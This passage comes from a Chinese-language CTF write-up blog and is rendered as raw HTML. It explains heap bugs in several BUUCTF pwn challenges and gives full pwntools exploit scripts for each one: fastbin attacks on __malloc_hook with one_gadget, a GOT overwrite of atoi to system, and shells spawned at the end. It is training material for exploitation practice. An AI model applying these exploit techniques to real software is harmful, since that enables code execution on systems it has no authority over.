punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>datare<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'OreOOrereOOreO%17$p'</span><span class="token punctuation">)</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OreOOrereOOreO'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">240</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>__libc_realloc_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4526a</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__libc_realloc_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__libc_realloc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__libc_realloc_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x8-roarctf-2019-easy-pwn"><a href="#0x8-roarctf-2019-easy-pwn" class="headerlink" title="0x8.roarctf_2019_easy_pwn"></a>0x8.roarctf_2019_easy_pwn</h2><p>保护全开，四个功能，增删查改，在edit功能中存在off-by-one，当我们输入的要修改的new_size==old_size+10时，就会产生一个off-by-one</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/22.jpg" alt=""></p><p>由于程序使用的是calloc，calloc会清空申请过来的chunk的内容，所以不能通过申请一个大小在unsortedbin中的chunk然后free再申请回来的方法泄露地址，于是我们要构造处堆块复用，之后再利用一次堆块复用造成fastbinattack，即由chunk0溢出到chunk1，使chunk1的大小被修改为chunk1_size+chunk2_size，之后free chunk1，于是把chunk2也放入了bin中，然后在分两次把chunk1和chunk2申请回来，此时，我们第二次申请过来的chunk2既是chunk2也是另一个堆块，我们称之为chunkn，chunk2和chunkn公用一个chunk，我们free掉chunk2，edit chunkn，实际上也就是在editchunk2，修改chunk2的fd指向malloc_hook-0x23即可，exp如下:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./roarctf_2019_easy_pwn'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./roarctf_2019_easy_pwn'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'roarctf_2019_easy_pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># r = remote('node3.buuoj.cn', 25724)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token operator">+</span><span class="token number">0xa</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>__malloc_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>__libc_realloc <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4526a</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__libc_realloc => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__libc_realloc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>__malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__libc_realloc<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x9-安恒四月赛sales-office-libc2-29"><a href="#0x9-安恒四月赛sales-office-libc2-29" class="headerlink" title="0x9.安恒四月赛sales_office(libc2.29)"></a>0x9.安恒四月赛sales_office(libc2.29)</h2><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/23.jpg" alt=""></p><p>got表可写，无PIE</p><p>程序的存储结构类似于content(0x20)–&gt;chunk,即系统分配一个0x20大小的chunk，存储着用户分配的chunk的地址。这道题一共有两个环境，一个2.27的，由于存在uaf，2.27的利用非常简单，相对于2.27，2.29的tcache存在对doublefree的检测，所以难度更大了一些，但fastbin中依旧可以doublefree，所以我们只需要把tcache填满，在fastbin中进行doublefree即可，exp如下：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./sales_office'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./sales_office'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># io = remote('das.wetolink.com', 28499)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./sales_office'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.29.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'house:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your house:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span>                <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0xa-hitcon-2018-children-tcache"><a href="#0xa-hitcon-2018-children-tcache" class="headerlink" title="0xa.hitcon_2018_children_tcache"></a>0xa.hitcon_2018_children_tcache</h2><p>考察点:off-by-null</p><p>题目保护全开，但由于是2.27的libc，存在tcache，所以利用会简单些</p><p>漏洞点在new功能中输入data的函数</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  v3 <span class="token operator">=</span> <span class="token function">__read_chk</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"read error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  result <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">-</span> <span class="token number">1LL</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    result <span class="token operator">=</span> v3 <span class="token operator">-</span> <span class="token number">1LL</span> <span class="token operator">+</span> a1<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span></code></pre><p>最后会将空格换为null</p><p>所以我们可以通过off-by-one泄露地址，并构造出堆块复用，造成doublefree，攻击malloc_hook</p><p>exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./HITCON_2018_children_tcache'</span><span class="token comment" spellcheck="true">#io = process('./HITCON_2018_children_tcache')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28160</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'HITCON_2018_children_tcache'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 1</span>add<span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 3</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token 